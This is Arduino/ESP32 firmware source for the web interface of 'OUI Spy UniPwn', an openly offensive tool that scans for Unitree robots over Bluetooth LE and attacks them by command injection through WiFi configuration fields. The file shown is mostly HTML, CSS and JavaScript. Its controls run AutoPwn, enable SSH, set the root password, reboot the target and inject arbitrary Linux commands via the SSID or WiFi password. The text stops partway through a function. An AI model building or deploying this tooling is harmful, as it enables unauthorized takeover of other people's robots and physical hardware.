/*
 * OUI Spy UniPwn Web Interface - Real BLE Functionality
 * Authentic OUI Spy styling with baby blue to pink gradient
 */

#include "config.h"

#if ENABLE_WEB_INTERFACE

#include <WebServer.h>
#include <DNSServer.h>
#include <ArduinoJson.h>

// Forward declarations
struct UnitreeDevice; // Forward declaration
class AsyncWebServerRequest; // Forward declaration for AsyncWebServer

extern std::vector<UnitreeDevice> discoveredDevices;
extern bool executeCommand(const UnitreeDevice& device, const String& command);
extern bool performHandshake(const UnitreeDevice& device);
extern void scanForDevices();
extern void startContinuousScanning();
extern void stopContinuousScanning();
extern bool continuousScanning;
extern bool buzzerEnabled;
extern bool ledEnabled;
extern void saveConfiguration();

// Hardware feedback function declarations
#if ENABLE_BUZZER
extern void singleBeep();
extern void stopProximityBeep();
#endif

#if ENABLE_LED_FEEDBACK
extern void ledBlink(int duration);
extern void stopProximityLED();
#endif

WebServer webServer(WEB_SERVER_PORT);
DNSServer dnsServer;

// Real-time update variables
String lastRealtimeUpdate = "";
bool realtimeUpdateAvailable = false;

// Serial log mirroring variables
String serialLogBuffer = "";
bool skipMenuOutput = true;  // Skip initial menu display

String getASCIIArt() {
    // ASCII art temporarily removed. Paste your new art below between R"( and )" or return empty.
    return String(R"(

)" );
}

const char* webPageHTML = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <title>OUI Spy - UniPwn Edition</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0; 
            padding: 20px;
            background: #0f0f23;
            color: #ffffff;
            position: relative;
            overflow-x: hidden;
        }
        .ascii-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.6;
            color: #ff0000;  /* Bright red ASCII art text */
            font-family: 'Courier New', monospace;
            font-size: 8px;
            line-height: 8px;
            white-space: pre;
            pointer-events: none;
            overflow: hidden;
        }
        .container {
            max-width: 800px; 
            margin: 0 auto; 
            background: rgba(255, 255, 255, 0.02);
            padding: 40px; 
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2); 
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255, 255, 255, 0.05);
            position: relative;
            z-index: 1;
        }
        h1 {
            text-align: center;
            margin-bottom: 20px;
            margin-top: 0px;
            font-size: 42px;
            font-weight: 700;
            color: #8a2be2;
            background: -webkit-linear-gradient(45deg, #8a2be2, #4169e1);
            background: -moz-linear-gradient(45deg, #8a2be2, #4169e1);
            background: linear-gradient(45deg, #8a2be2, #4169e1);
            -webkit-background-clip: text;
            -moz-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
            -moz-text-fill-color: transparent;
            letter-spacing: 3px;
        }
        .section { 
            margin-bottom: 25px; 
            padding: 20px; 
            border: 1px solid rgba(255, 255, 255, 0.1); 
            border-radius: 12px; 
            background: rgba(255, 255, 255, 0.01); 
            backdrop-filter: blur(3px);
            text-align: center;
        }
        .section h3 { 
            margin-top: 0; 
            color: #ffffff; 
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 15px;
        }
        button { 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            color: #ffffff; 
            padding: 12px 24px; 
            border: none; 
            border-radius: 8px; 
            cursor: pointer; 
            font-size: 14px; 
            font-weight: 500;
            margin: 8px 4px; 
            transition: all 0.3s;
            display: inline-block;
        }
        button:hover { 
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
        }
        button.danger {
            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
        }
        input, select, textarea { 
            width: 100%; 
            padding: 12px; 
            border: 1px solid rgba(255, 255, 255, 0.2); 
            border-radius: 8px; 
            background: rgba(255, 255, 255, 0.02);
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            font-size: 14px;
            margin: 5px 0;
            text-align: left;
        }
        .status { 
            padding: 15px; 
            border-radius: 8px; 
            margin-bottom: 20px; 
            border-left: 4px solid #ff1493;
            background: rgba(255, 20, 147, 0.05);
            color: #ffffff;
            border: 1px solid rgba(255, 20, 147, 0.2);
        }
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        #logOutput {
            min-height: 300px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            background: rgba(0, 0, 0, 0.3);
            color: #00ff00;
        }
        .log-serial { color: #89CFF0; }      /* Baby blue for serial debug */
        .log-ble { color: #89CFF0; }         /* Baby blue for BLE events */
        .log-bluetooth { color: #0080ff; }   /* Blue for bluetooth events */
        .log-detection { color: #ff1493; }   /* HOT PINK for device detections */
        .log-web { color: #32ff32; }         /* Green for web events */
        .log-exploit { color: #ff6b6b; }     /* Red for exploit actions */
        .log-target { color: #ffff32; }      /* Yellow for target events */
        .log-error { color: #ff3232; }       /* Bright red for errors */
        .log-success { color: #32ff32; }     /* Green for success */
        .log-scan { color: #ff69b4; }        /* Pink for scanning */
        .log-uuid { color: #89CFF0; }        /* Baby blue for UUIDs */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 15px;
            margin: 15px 0;
        }
        .stat-item {
            text-align: center;
            padding: 12px;
            background: rgba(138, 43, 226, 0.1);
            border-radius: 8px;
            border: 1px solid rgba(138, 43, 226, 0.3);
        }
        .stat-value {
            font-size: 24px;
            font-weight: bold;
            color: #8a2be2;
        }
        .stat-label {
            font-size: 12px;
            color: #cccccc;
            margin-top: 5px;
        }
        .scan-dots {
            color: #00ff00;
            font-weight: bold;
        }
        input[type="checkbox"] {
            width: auto;
            margin-right: 8px;
        }
        label {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .target-button {
            padding: 15px;
            margin: 5px;
            border: 2px solid #ff6b6b;
            border-radius: 8px;
            background: rgba(255, 107, 107, 0.1);
            color: #ffffff;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: left;
            min-width: 300px;
            font-family: 'Courier New', monospace;
        }
        .target-button:hover {
            border-color: #32ff32;
            background: rgba(50, 255, 50, 0.1);
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(50, 255, 50, 0.3);
        }
        .target-button.selected {
            border-color: #32ff32;
            background: rgba(50, 255, 50, 0.2);
            color: #0a0a0a; /* dark text for readability on green */
        }
        .target-button .robot-name {
            font-size: 18px;
            font-weight: bold;
            color: #ff6b6b;
            margin-bottom: 5px;
        }
        .target-button.selected .robot-name {
            color: #0a0a0a; /* dark title on green */
        }
        .target-button .robot-info {
            font-size: 12px;
            color: #cccccc;
            line-height: 1.4;
        }
        .rssi-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 8px;
            border: 1px solid rgba(255,255,255,0.3);
        }
        .rssi-excellent { background-color: #32ff32; box-shadow: 0 0 8px #32ff32; }
        .rssi-good { background-color: #ffff32; box-shadow: 0 0 8px #ffff32; }
        .rssi-fair { background-color: #ff8c32; box-shadow: 0 0 8px #ff8c32; }
        .rssi-weak { background-color: #ff3232; box-shadow: 0 0 8px #ff3232; }
        #targetButtons {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        @media (max-width: 768px) {
            .grid { grid-template-columns: 1fr; }
            h1 { font-size: 32px; }
            .container { padding: 20px; margin: 10px; }
            .target-button { min-width: 250px; }
        }
    </style>
</head>
<body>
    <div class="ascii-background"></div>
    <div class="container">
        <h1>OUI SPY - UNIPWN</h1>
        
        <div class="status">
            Unitree Robot BLE Exploit Platform - Based on github.com/Bin4ry/UniPwn - Command Injection via WiFi Config
        </div>
        
        <div class="grid">
            <div class="section">
                <h3>Target Discovery</h3>
                <div style="margin-bottom: 15px;">
                    <button onclick="toggleScan()" id="scanButton">Start BLE Scan</button>
                    <button onclick="clearTargets()">Clear Targets</button>
                </div>
                <div id="scanStatus" style="margin: 10px 0; min-height: 20px;">
                    <div id="scanIndicator" style="display: none; color: #00ff00;">
                        Scanning for Unitree robots<span id="scanDots">.</span>
                    </div>
                </div>
                <div class="stats-grid">
                    <div class="stat-item">
                        <div class="stat-value" id="targetsFound">0</div>
                        <div class="stat-label">Targets Found</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="scanDuration">0s</div>
                        <div class="stat-label">Scan Duration</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="totalScans">0</div>
                        <div class="stat-label">Total Scans</div>
                    </div>
                </div>
                <textarea id="deviceList" readonly placeholder="Discovered Unitree robots will appear here..."></textarea>
            </div>
            
            <div class="section">
                <h3>Target Selection</h3>
                <div id="targetSelectionArea" style="margin-bottom: 15px;">
                    <div id="noTargetsMessage" style="padding: 15px; text-align: center; color: #cccccc; border: 2px dashed #555; border-radius: 8px;">
                        No targets detected. Start a BLE scan to discover Unitree robots.
                    </div>
                    <div id="targetButtons" style="display: none; gap: 10px; flex-wrap: wrap;">
                        <!-- Target buttons will be populated here -->
                    </div>
                </div>
            </div>
            
            <div class="section">
                <h3>Hardware Settings</h3>
                <div class="toggle-container" style="display: flex; flex-direction: column; gap: 15px;">
                    <div class="toggle-item">
                        <label style="color: #ffffff; display: flex; align-items: center; gap: 10px;">
                            <input type="checkbox" id="buzzerEnabled" name="buzzerEnabled" onchange="toggleBuzzer()" )html" + String(buzzerEnabled ? "checked" : "") + R"html(>
                            <span>Enable Buzzer</span>
                        </label>
                        <div style="color: #cccccc; font-size: 12px; margin-top: 5px;">Audio feedback for boot and bot detection</div>
                    </div>
                    <div class="toggle-item">
                        <label style="color: #ffffff; display: flex; align-items: center; gap: 10px;">
                            <input type="checkbox" id="ledEnabled" name="ledEnabled" onchange="toggleLED()" )html" + String(ledEnabled ? "checked" : "") + R"html(>
                            <span>Enable LED</span>
                        </label>
                        <div style="color: #cccccc; font-size: 12px; margin-top: 5px;">Orange LED blinks with buzzer feedback</div>
                    </div>
                    <button onclick="saveHardwareSettings()" style="margin-top: 15px; padding: 10px 20px; background: #32ff32; color: #000; border: none; border-radius: 4px; cursor: pointer; font-weight: bold;">Save Hardware Settings</button>
                </div>
            </div>
            
            <div class="section">
                <h3>Attack Vectors</h3>
                <div id="selectedTarget" style="margin-bottom: 15px; padding: 10px; border: 2px solid #ff6b6b; border-radius: 8px; background: rgba(255, 107, 107, 0.1); color: #ff6b6b; font-weight: bold;">
                    No target selected - Click a robot above to select
                </div>
                
                <div style="margin-bottom: 25px; padding: 15px; border: 2px solid #ff6b6b; border-radius: 8px; background: rgba(255, 107, 107, 0.1);">
                    <h4 style="color: #ff6b6b; margin-bottom: 10px;">AutoPwn - Complete Exploitation</h4>
                    <button onclick="try { startAutoPwn(); } catch(e) { console.error('AutoPwn error:', e); alert('AutoPwn error: ' + e.message); }" id="autoPwnButton" style="background: linear-gradient(45deg, #ff6b6b, #ff8e8e); font-weight: bold; font-size: 16px; padding: 12px 20px;">
                        START AUTOPWN
                    </button>
                    <div id="autoPwnStatus" style="margin-top: 10px; min-height: 20px;"></div>
                    <div id="autoPwnProgress" style="display: none; margin-top: 10px;">
                        <div style="background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden;">
                            <div id="progressBar" style="height: 20px; background: linear-gradient(90deg, #32ff32, #ff69b4); width: 0%; transition: width 0.5s;"></div>
                        </div>
                        <div id="progressText" style="text-align: center; margin-top: 5px; color: #ffffff;">0% - Initializing...</div>
                        <div id="autoPwnSteps" style="margin-top: 15px; max-height: 200px; overflow-y: auto; background: rgba(0,0,0,0.3); border-radius: 5px; padding: 10px;">
                            <div style="color: #ffffff; font-weight: bold; margin-bottom: 10px;">AutoPwn Steps:</div>
                            <div id="stepsList" style="font-family: monospace; font-size: 12px;"></div>
                        </div>
                    </div>
                </div>
                
                <div style="border-top: 1px solid rgba(255,255,255,0.1); padding-top: 15px;">
                    <h4 style="color: #cccccc; margin-bottom: 10px;">Manual Attacks</h4>
                    <button onclick="quickExploit('enable_ssh')">Enable SSH</button>
                    <button onclick="quickExploit('change_root_pwd')">Set Root Password</button>
                    <button onclick="quickExploit('reboot')" class="danger">Reboot Target</button>
                    
                    <h4 style="color: #ffffff; font-size: 14px; margin: 20px 0 10px 0;">Custom Command</h4>
                    <input type="text" id="customCommand" placeholder="Enter custom Linux command...">
                    <select id="injectionMethod">
                        <option value="ssid">Inject via SSID</option>
                        <option value="password">Inject via WiFi Password</option>
                    </select>
                    <button onclick="customExploit()">Execute Custom</button>
                </div>
                
                <div class="stats-grid">
                    <div class="stat-item">
                        <div class="stat-value" id="successfulExploits">0</div>
                        <div class="stat-label">Successful</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="failedExploits">0</div>
                        <div class="stat-label">Failed</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="autoPwnCount">0</div>
                        <div class="stat-label">AutoPwn Runs</div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="section">
            <h3>System Monitor</h3>
            <div class="stats-grid">
                <div class="stat-item">
                    <div class="stat-value" id="freeHeap">--</div>
                    <div class="stat-label">Free Heap (KB)</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="uptime">--</div>
                    <div class="stat-label">Uptime</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="wifiStatus">--</div>
                    <div class="stat-label">WiFi Status</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="bleStatus">--</div>
                    <div class="stat-label">BLE Status</div>
                </div>
            </div>
            <button onclick="getSystemInfo()">Refresh System Info</button>
        </div>
        
        <div class="section">
            <h3>Operations Log</h3>
            <div id="logOutput" style="min-height: 300px; font-family: 'Courier New', monospace; font-size: 12px; background: rgba(0, 0, 0, 0.3); color: #00ff00; padding: 10px; border: 1px solid #333; border-radius: 5px; overflow-y: auto; white-space: pre-wrap; max-height: 400px; text-align: left;"></div>
            <div style="text-align: center; margin-top: 15px;">
                <button onclick="clearLog()">Clear Log</button>
                <button onclick="exportLog()">Export Log</button>
            </div>
        </div>
    </div>

    <script>
        let selectedDevice = null;
        let exploitStats = { successful: 0, failed: 0 };
        let isScanning = false;
        let continuousTimer = null;
        let scanCount = 0;
        let scanInterval;
        let autoPwnRunning = false;
        let autoPwnCount = 0;
        let backgroundPoll = null;
        let discoveredDevices = []; // Store discovered devices for persistence
        let loggedDevices = new Set(); // Track which devices we've already logged to avoid spam
        let bleDeviceLogTimes = {};     // Throttle BLE DEVICE logs per address
        let unitreeLogged = new Set();  // Prevent repeated UNITREE detection logs

        // Comprehensive persistence functions
        function saveState() {
            const state = {
                // Do not persist selected target across sessions
                exploitStats: exploitStats,
                // DO NOT persist scan states - they should reset on page refresh
                discoveredDevices: discoveredDevices,
                autoPwnRunning: autoPwnRunning,
                autoPwnCount: autoPwnCount,
                scanCount: scanCount,
                timestamp: Date.now()
            };
            localStorage.setItem('ouispyState', JSON.stringify(state));
        }

        function loadState() {
            const savedState = localStorage.getItem('ouispyState');
            if (savedState) {
                try {
                    const state = JSON.parse(savedState);
                    
                    // Restore state
                    // Do not restore selected target
                    selectedDevice = null;
                    exploitStats = state.exploitStats || { successful: 0, failed: 0 };
                    // DO NOT restore scan states - always start fresh
                    isScanning = false;
                    discoveredDevices = state.discoveredDevices || [];
                    autoPwnRunning = state.autoPwnRunning || false;
                    autoPwnCount = state.autoPwnCount || 0;
                    scanCount = state.scanCount || 0;
                    
                    // Update UI with restored state
                    updateUIFromState();
                    
                    addLog('STATE RESTORED: All settings and data preserved across refresh', 'success');
                    return true;
                } catch (e) {
                    console.log('Failed to restore state:', e);
                    return false;
                }
            }
            return false;
        }

        function updateUIFromState() {
            // Update exploit stats display
            document.getElementById('successfulExploits').textContent = exploitStats.successful;
            document.getElementById('failedExploits').textContent = exploitStats.failed;
            
            // Scan button always starts as "Start Scanning" - no persistence
            document.getElementById('scanButton').textContent = 'Start Scanning';
            
            // Restore discovered devices and show them
            if (discoveredDevices.length > 0) {
                showTargets(discoveredDevices);
                document.getElementById('targetsFound').textContent = discoveredDevices.length;
            }
            
            // Restore selected device display
            if (selectedDevice) {
                const targetDisplay = document.getElementById('selectedTarget');
                targetDisplay.innerHTML = 
                    '<strong>SELECTED TARGET:</strong><br>' +
                    'Model: ' + selectedDevice.name + '<br>' +
                    'Address: ' + selectedDevice.address + '<br>' +
                    'Signal: ' + selectedDevice.rssi + 'dBm<br>' +
                    'UUID: ' + (selectedDevice.uuid || 'N/A');
                targetDisplay.style.borderColor = '#32ff32';
                targetDisplay.style.backgroundColor = 'rgba(50,255,50,0.1)';
                targetDisplay.style.color = '#32ff32';
            }
        }

        function addLog(message, type = 'info') {
            const logOutput = document.getElementById('logOutput');
            const timestamp = new Date().toLocaleTimeString();
            let prefix = '[i]';
            let color = '#00ff00'; // Default green
            
            // Set prefix and color based on type
            if (type === 'success') { prefix = '[+]'; color = '#32ff32'; }
            else if (type === 'error') { prefix = '[-]'; color = '#ff3232'; }
            else if (type === 'scan') { prefix = '[*]'; color = '#ff69b4'; }
            else if (type === 'exploit') { prefix = '[>]'; color = '#ff6b6b'; }
            else if (type === 'ble') { prefix = '[BLE]'; color = '#89CFF0'; }
            else if (type === 'bluetooth') { prefix = '[BT]'; color = '#0080ff'; }
            else if (type === 'detection') { prefix = '[DETECT]'; color = '#ff1493'; }
            else if (type === 'web') { prefix = '[WEB]'; color = '#32ff32'; }
            else if (type === 'serial') { prefix = '[//]'; color = '#89CFF0'; }
            else if (type === 'target') { prefix = '[TARGET]'; color = '#ffff32'; }
            else if (type === 'uuid') { prefix = '[UUID]'; color = '#89CFF0'; }
            else if (type === 'info') { prefix = '[INFO]'; color = '#0080ff'; }
            else if (type === 'warning') { prefix = '[WARN]'; color = '#ffff32'; }
            
            const logEntry = `<span style="color: ${color};">${timestamp} ${prefix} ${message}</span><br>`;
            logOutput.innerHTML += logEntry;
            logOutput.scrollTop = logOutput.scrollHeight;
        }
        
        // Enhanced log function for serial debug mirroring
        function addSerialLog(message, category = 'serial') {
            // Mirror all serial output to operations log with color coding
            const timestamp = new Date().toLocaleTimeString();
            const logOutput = document.getElementById('logOutput');
            
            // Determine color based on message content
            let color = '#89CFF0'; // Default baby blue
            let prefix = '[SERIAL]';
            
            // Throttle duplicate BLE/UNITREE detections to reduce spam
            if (message.includes('BLE DEVICE:')) {
                const match = message.match(/\(([0-9A-Fa-f:]+)\)/);
                if (match && match[1]) {
                    const addr = match[1];
                    const now = Date.now();
                    if (bleDeviceLogTimes[addr] && (now - bleDeviceLogTimes[addr] < 5000)) {
                        return; // Skip duplicate within 5s
                    }
                    bleDeviceLogTimes[addr] = now;
                }
            } else if (message.includes('*** UNITREE TARGET DETECTED ***')) {
                const match = message.match(/\(([0-9A-Fa-f:]+)\)/);
                if (match && match[1]) {
                    const addr = match[1];
                    if (unitreeLogged.has(addr)) {
                        return; // Already logged this Unitree device
                    }
                    unitreeLogged.add(addr);
                }
            }

            if (message.includes('[SUCCESS]')) {
                color = '#32ff32';
                prefix = '[SUCCESS]';
            } else if (message.includes('[ERROR]')) {
                color = '#ff3232';
                prefix = '[ERROR]';
            } else if (message.includes('[INFO]')) {
                color = '#0080ff';
                prefix = '[INFO]';
            } else if (message.includes('[WARN]')) {
                color = '#ffff32';
                prefix = '[WARN]';
            } else if (message.includes('[BLE]')) {
                color = '#89CFF0';
                prefix = '[BLE]';
            } else if (message.includes('[UUID]')) {
                color = '#89CFF0';
                prefix = '[UUID]';
            } else if (message.includes('*** UNITREE TARGET DETECTED ***')) {
                color = '#ff1493';
                prefix = '[UNITREE]';
            } else if (message.includes('BLE DEVICE:')) {
                color = '#87CEEB';
                prefix = '[BLE]';
            }
            
            // Add to log with color coding
            const logEntry = `<span style="color: ${color};">${timestamp} ${prefix} ${message}</span><br>`;
            logOutput.innerHTML += logEntry;
            logOutput.scrollTop = logOutput.scrollHeight;
        }

        function clearLog() {
            document.getElementById('logOutput').innerHTML = '';
            addLog('Operations log cleared', 'info');
        }

        function exportLog() {
            const logContent = document.getElementById('logOutput').innerText;
            const blob = new Blob([logContent], { type: 'text/plain' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            const timestamp = new Date().toISOString().slice(0,19).replace(/:/g, '-');
            a.download = 'ouispy-unipwn-log-' + timestamp + '.txt';
            a.click();
            window.URL.revokeObjectURL(url);
        }

        function clearTargets() {
            document.getElementById('deviceList').value = '';
            document.getElementById('targetsFound').textContent = '0';
            selectedDevice = null;
            document.getElementById('selectedTarget').innerHTML = 'No target selected - Click a robot below to select';
            document.getElementById('selectedTarget').style.borderColor = '#ff6b6b';
            document.getElementById('selectedTarget').style.backgroundColor = 'rgba(255, 107, 107, 0.1)';
            document.getElementById('selectedTarget').style.color = '#ff6b6b';
            
            // Clear target buttons
            document.getElementById('noTargetsMessage').style.display = 'block';
            document.getElementById('targetButtons').style.display = 'none';
            document.getElementById('targetButtons').innerHTML = '';
            
            // Disable attack buttons
            document.getElementById('autoPwnButton').disabled = true;
            document.getElementById('autoPwnButton').textContent = 'START AUTOPWN';
            document.getElementById('autoPwnButton').style.background = 'linear-gradient(45deg, #ff6b6b, #ff8e8e)';
            
            addLog('Target list cleared', 'info');
        }

        function updateTargetsRealtime(devices) {
            
            const deviceList = document.getElementById('deviceList');
            const targetsFound = document.getElementById('targetsFound');
            
            // Update the text area for detailed info
            if (devices.length === 0) {
                deviceList.value = 'No Unitree robots detected.<br><br>Ensure targets are:<br>- Powered on and active<br>- Within BLE range (10-30m)<br>- Not in sleep mode<br><br>Supported models: Go2, G1, H1, B2';
                targetsFound.textContent = '0';
            } else {
                let output = 'LIVE TARGETS DETECTED (' + devices.length + '):<br>';
                output += '='.repeat(50) + '<br><br>';
                
                devices.forEach((device, index) => {
                    const rssi = device.rssi ? device.rssi + 'dBm' : 'N/A';
                    const model = device.name ? device.name.replace('Unitree_', '') : 'Unknown';
                    const signalStrength = device.rssi > -60 ? 'Excellent' : device.rssi > -70 ? 'Good' : device.rssi > -80 ? 'Fair' : 'Weak';
                    
                    output += 'TARGET #' + (index + 1) + '<br>';
                    output += 'Model: ' + model + '<br>';
                    output += 'Address: ' + device.address + '<br>';
                    output += 'Signal: ' + rssi + ' (' + signalStrength + ')<br>';
                    output += 'Status: READY FOR EXPLOITATION<br>';
                    output += '-'.repeat(40) + '<br><br>';
                });
                
                deviceList.value = output;
                targetsFound.textContent = devices.length;
            }
            
            // Update the clickable target selection area
            showTargets(devices); // Use the guaranteed working function
            
            // Store devices for selection
            window.discoveredDevices = devices;
            
            addLog('Real-time update: ' + devices.length + ' targets ready for selection', 'success');
        }

        // DISABLED - using showTargets instead
        function updateTargetButtons_DISABLED(devices) {
            const noTargetsMessage = document.getElementById('noTargetsMessage');
            const targetButtons = document.getElementById('targetButtons');
            
            if (devices.length === 0) {
                noTargetsMessage.style.display = 'block';
                targetButtons.style.display = 'none';
                targetButtons.innerHTML = '';
                return;
            }
            
            noTargetsMessage.style.display = 'none';
            targetButtons.style.display = 'flex';
            targetButtons.innerHTML = '';
            
            devices.forEach((device, index) => {
                const model = device.name ? device.name.replace('Unitree_', '') : 'Unknown';
                const rssi = device.rssi ? device.rssi + 'dBm' : 'N/A';
                const signalStrength = device.rssi > -60 ? 'Excellent' : device.rssi > -70 ? 'Good' : device.rssi > -80 ? 'Fair' : 'Weak';
                const rssiClass = device.rssi > -60 ? 'rssi-excellent' : device.rssi > -70 ? 'rssi-good' : device.rssi > -80 ? 'rssi-fair' : 'rssi-weak';
                
                const button = document.createElement('div');
                button.className = 'target-button';
                button.onclick = () => selectTargetFromButton(device, button);
                
                button.innerHTML = 
                    '<div class=\"robot-name\">' + model + '</div>' +
                    '<div class=\"robot-info\">' +
                    'Address: ' + device.address + '<br>' +
                    '<span class=\"rssi-indicator ' + rssiClass + '\"></span>Signal: ' + rssi + ' (' + signalStrength + ')<br>' +
                    'Status: Ready for exploitation' +
                    '</div>';
                
                targetButtons.appendChild(button);
            });
        }

        function selectTargetFromButton(device, buttonElement) {
            // Remove selected class from all buttons
            document.querySelectorAll('.target-button').forEach(btn => {
                btn.classList.remove('selected');
            });
            
            // Add selected class to clicked button
            buttonElement.classList.add('selected');
            
            // Select the target
            selectTarget(device);
        }

        function selectTarget(device) {
            selectedDevice = device;
            const model = device.name ? device.name.replace('Unitree_', '') : 'Unknown';
            const rssi = device.rssi ? device.rssi + 'dBm' : 'N/A';
            const signalStrength = device.rssi > -60 ? 'Excellent' : device.rssi > -70 ? 'Good' : device.rssi > -80 ? 'Fair' : 'Weak';
            
            document.getElementById('selectedTarget').innerHTML = 
                '<strong>SELECTED TARGET:</strong><br>' +
                'Model: ' + model + '<br>' +
                'Address: ' + device.address + '<br>' +
                'Signal: ' + rssi + ' (' + signalStrength + ')';
            
            document.getElementById('selectedTarget').style.borderColor = '#32ff32';
            document.getElementById('selectedTarget').style.backgroundColor = 'rgba(50, 255, 50, 0.1)';
            document.getElementById('selectedTarget').style.color = '#32ff32';
            
            addLog('Target selected: ' + model + ' (' + device.address + ') - Ready for exploitation!', 'success');
            
            // Enable attack buttons
            document.getElementById('autoPwnButton').disabled = false;
            document.getElementById('autoPwnButton').textContent = 'START AUTOPWN ON ' + model.toUpperCase();
            document.getElementById('autoPwnButton').style.background = 'linear-gradient(45deg, #32ff32, #69ff69)';
            document.getElementById('autoPwnButton').style.color = '#0a0a0a';
        }

        let scanRunning = false;
        let realtimePoll = null;
        let serialPoll = null;
        let scanStartTime = 0;
        
        // Start serial log polling for real-time operations log updates
        function startSerialPolling() {
            if (serialPoll) clearInterval(serialPoll);
            
            serialPoll = setInterval(() => {
                fetch('/serial')
                    .then(response => response.json())
                    .then(data => {
                if (data.serial && data.serial.length > 0) {
                    // Split by HTML breaks and add each line to the operations log
                    const lines = data.serial.split('<br>');
                            lines.forEach(line => {
                                if (line.trim().length > 0) {
                                    addSerialLog(line.trim());
                                }
                            });
                        }
                    })
                    .catch(error => console.log('Serial poll error:', error));
            }, 250); // 250ms polling for smooth operations log updates
        }

        function scanDevices() {
            if (scanRunning) return;
            scanRunning = true;
            
            addLog('BLE SCAN INITIATED: Real-time detection active', 'ble');
            document.getElementById('scanStatus').innerHTML = '<span style="color: #32ff32;">Scanning for bots<span id="scanDots">.</span></span>';
            
            // Set scan start time for duration tracking
            scanStartTime = Date.now();
            
            // Start dot animation
            let dotCount = 1;
            const dotAnimation = setInterval(() => {
                // CRITICAL FIX: Check isScanning flag instead of scanRunning
                if (!isScanning) {
                    clearInterval(dotAnimation);
                    return;
                }
                dotCount = (dotCount % 3) + 1;
                const dots = '.'.repeat(dotCount);
                const dotsElement = document.getElementById('scanDots');
                if (dotsElement) {
                    dotsElement.textContent = dots;
                }
            }, 500);
            
            // Clear targets
            showTargets([]);
            
            // REAL-TIME polling every 100ms for INSTANT target detection
            realtimePoll = setInterval(() => {
                // CRITICAL FIX: Check isScanning flag to stop polling when user stops
                if (!isScanning) {
                    clearInterval(realtimePoll);
                    realtimePoll = null;
                    scanRunning = false;
                    return;
                }
                
                fetch('/poll')
                    .then(response => response.json())
                    .then(data => {
                        if (data.devices && data.devices.length > 0) {
                            // Only log NEW Unitree detections once; BLE devices throttled in addSerialLog
                            data.devices.forEach((device, index) => {
                                const deviceKey = device.address;
                                if (!loggedDevices.has(deviceKey)) {
                                    addLog('ROBOT DETECTED: ' + device.name + ' [' + device.address + '] RSSI: ' + device.rssi + 'dBm', 'detection');
                                    if (device.uuid && device.uuid !== 'N/A') {
                                        addLog('└─ UUID: ' + device.uuid, 'uuid');
                                    }
                                    loggedDevices.add(deviceKey);
                                }
                            });
                            showTargets(data.devices);
                            // Update count immediately
                            document.getElementById('scanStatus').innerHTML = '<span style="color: #32ff32;">LIVE: ' + data.devices.length + ' robots detected</span>';
                        }
                    })
                    .catch(error => console.log('Poll error:', error));
            }, 100); // ULTRA-FAST 100ms polling for real-time updates
            
            // Start the scan
            fetch('/scan', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.success && data.continuous) {
                        addLog('BACKEND CONTINUOUS SCANNING: Active - polls every 1.5 seconds', 'success');
                        document.getElementById('scanStatus').innerHTML = '<span style="color: #32ff32;">Scanning<span id="scanDots">.</span></span>';
                        // Start dot animation if not already running
                        if (!dotAnimation) {
                            dotCount = 1;
                            dotAnimation = setInterval(() => {
                                dotCount = (dotCount % 3) + 1;
                                const dots = '.'.repeat(dotCount);
                                const dotsElement = document.getElementById('scanDots');
                                if (dotsElement) {
                                    dotsElement.textContent = dots;
                                }
                            }, 500);
                        }
                    } else {
                        // Legacy single scan response
                        setTimeout(() => {
                            clearInterval(realtimePoll);
                            scanRunning = false;
                            addLog('SCAN CYCLE COMPLETE: ' + (data.devices ? data.devices.length : 0) + ' targets found', 'success');
                            document.getElementById('scanStatus').innerHTML = '<span style="color: #32ff32;">Scan complete</span>';
                        }, 10000);
                    }
                })
                .catch(error => {
                    clearInterval(realtimePoll);
                    scanRunning = false;
                    addLog('SCAN ERROR: ' + error.message, 'error');
                    document.getElementById('scanStatus').innerHTML = '<span style="color: #ff3232;">Scan failed</span>';
                });
        }
        
        function showTargets(devices) {
            
            // Store discovered devices for persistence
            discoveredDevices = devices;
            
            // GUARANTEED target count update
            document.getElementById('targetsFound').textContent = devices.length;
            
            const noMsg = document.getElementById('noTargetsMessage');
            const buttons = document.getElementById('targetButtons');
            
            // FORCE clear everything first
            buttons.innerHTML = '';
            
            if (!devices || devices.length === 0) {
                noMsg.style.display = 'block';
                buttons.style.display = 'none';
                return;
            }
            
            // GUARANTEED button creation
            noMsg.style.display = 'none';
            buttons.style.display = 'flex';
            buttons.style.flexDirection = 'column';
            buttons.style.gap = '10px';
            
            // Create buttons with proper CSS classes and selection handling
